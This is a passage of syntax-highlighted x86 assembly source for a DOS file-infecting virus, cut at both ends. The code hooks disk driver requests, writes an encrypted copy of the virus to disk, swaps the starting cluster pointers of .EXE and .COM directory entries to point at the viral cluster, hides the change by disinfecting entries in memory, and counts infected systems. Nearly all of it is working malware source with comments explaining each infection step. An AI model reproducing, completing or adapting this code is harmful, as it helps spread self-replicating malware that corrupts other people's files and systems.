        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRequest</span><span class="sc0">       </span><span class="sc1">; disk</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">DiskInfected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; read it again</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadSector</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; is it written correctly ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DiskInfected</span><span class="sc0">        </span><span class="sc1">; no, can't infect disk</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; calculate the sector number</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; to write the virus to</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; store it in the request hdr</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Less</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">Less</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">; write it</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EncryptWrite1</span><span class="sc0">

</span><span class="sc5">DiskInfected</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; restore this byte</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">             </span><span class="sc1">; restore other part of the</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; request</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">Load</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Load</span><span class="sc0">
</span><span class="sc5">Read</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRequest</span><span class="sc0">       </span><span class="sc1">; do request</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
</span><span class="sc5">InfectSector</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get number of sectors read</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get address of data</span><span class="sc0">
        </span><span class="sc6">sal</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">; calculate end of buffer</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; infect the sector</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find</span><span class="sc0">
        </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">no_inf</span><span class="sc0">          </span><span class="sc1">; write sector ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; save command byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRequest</span><span class="sc0">       </span><span class="sc1">; write sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">; restore command byte</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">07fh</span><span class="sc0">
</span><span class="sc5">no_inf</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; disinfect sector in memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc0">          </span><span class="sc1">; return to caller</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; Subroutines                                                                 ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">

</span><span class="sc5">Find</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; (dis)infect sector in memory</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"XE"</span><span class="sc0">         </span><span class="sc1">; check for .exe</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">com</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">found</span><span class="sc0">
</span><span class="sc5">Com</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"OC"</span><span class="sc0">         </span><span class="sc1">; check for .com</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">go_on</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc3">"M"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">go_on</span><span class="sc0">
</span><span class="sc5">Found</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">],</span><span class="sc2">0ffc0h</span><span class="sc0"> </span><span class="sc1">; file to big</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">go_on</span><span class="sc0">               </span><span class="sc1">; more than 4mb</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc2">03ff8h</span><span class="sc0"> </span><span class="sc1">; file to small</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">go_on</span><span class="sc0">               </span><span class="sc1">; less than  2048 bytes</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0bh</span><span class="sc4">],</span><span class="sc2">1ch</span><span class="sc0">    </span><span class="sc1">; directory, system or</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">go_on</span><span class="sc0">               </span><span class="sc1">; volume label</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">           </span><span class="sc1">; infect or disinfect ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">rest</span><span class="sc0">
</span><span class="sc5">Pointer</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">        </span><span class="sc1">; ax = viral cluster</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; file already infected ?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">go_on</span><span class="sc0">           </span><span class="sc1">; yes, go on</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; exchange pointers</span><span class="sc0">
</span><span class="sc5">Gad</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">        </span><span class="sc1">; encryption</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; store it on another place</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">go_on</span><span class="sc0">           </span><span class="sc1">; change cx and go on</span><span class="sc0">
</span><span class="sc9">Rest</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; ax = 0</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get pointer</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">gad</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Encrypt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; store it on the right place</span><span class="sc0">
</span><span class="sc5">Go_on</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">gad</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; change encryption</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">           </span><span class="sc1">; next directory entry</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; end of buffer ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">find</span><span class="sc0">            </span><span class="sc1">; no, do it again</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; return</span><span class="sc0">

</span><span class="sc5">Check</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; get number of unit</span><span class="sc0">
</span><span class="sc5">Drive</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; same as last call ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">drive</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">    </span><span class="sc1">; set 2nd parameter</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Changed</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; save word</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; disk changed ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRequest</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; 1=Yes</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; restore word</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">            </span><span class="sc1">; restore command</span><span class="sc0">
</span><span class="sc5">Changed</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; return</span><span class="sc0">

</span><span class="sc5">ReadSector</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; read sector from disk</span><span class="sc0">

</span><span class="sc5">DoRequest</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">09ah</span><span class="sc0">            </span><span class="sc1">; call 70:?, orginal strategy</span><span class="sc0">
</span><span class="sc5">StrBlock</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">09ah</span><span class="sc0">            </span><span class="sc1">; call 70:?, orginal interrupt</span><span class="sc0">
</span><span class="sc5">IntBlock</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">  </span><span class="sc1">; error ? yes, zf = 0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; return</span><span class="sc0">

</span><span class="sc5">Convert</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ff0h</span><span class="sc0">        </span><span class="sc1">; convert cluster number into</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Fat16</span><span class="sc0">           </span><span class="sc1">; an sector number and offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; into this sector containing</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">gad</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">   </span><span class="sc1">; the fat-item of this</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; cluster</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0fffh</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0fff0h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">
</span><span class="sc5">Fat16</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
</span><span class="sc5">Continue</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EncryptWrite1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">              </span><span class="sc1">; write virus to disk</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">              </span><span class="sc1">; (encrypted) save regs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                 </span><span class="sc1">; copy forward</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">               </span><span class="sc1">; length of encryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Encrypt</span><span class="sc0">       </span><span class="sc1">; start of encryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EncryptWrite2</span><span class="sc0">     </span><span class="sc1">; destenation</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; change xor value</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; copy encryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">               </span><span class="sc1">; copy dorequest proc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DoRequest</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">               </span><span class="sc1">; copy encryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Encrypt</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0c31fh</span><span class="sc0">           </span><span class="sc1">; store "pop ds","ret"</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; instructions</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">              </span><span class="sc1">; restore register</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EncryptWrite2</span><span class="sc0">           </span><span class="sc1">; encrypt and write vir</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; Data                                                                        ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">

</span><span class="sc5">File</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"C:"</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; the virus tries to open this</span><span class="sc0">
                        </span><span class="sc1">; file</span><span class="sc0">

</span><span class="sc5">Counter</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; this will count the number of</span><span class="sc0">
                        </span><span class="sc1">; systems that are infected by</span><span class="sc0">
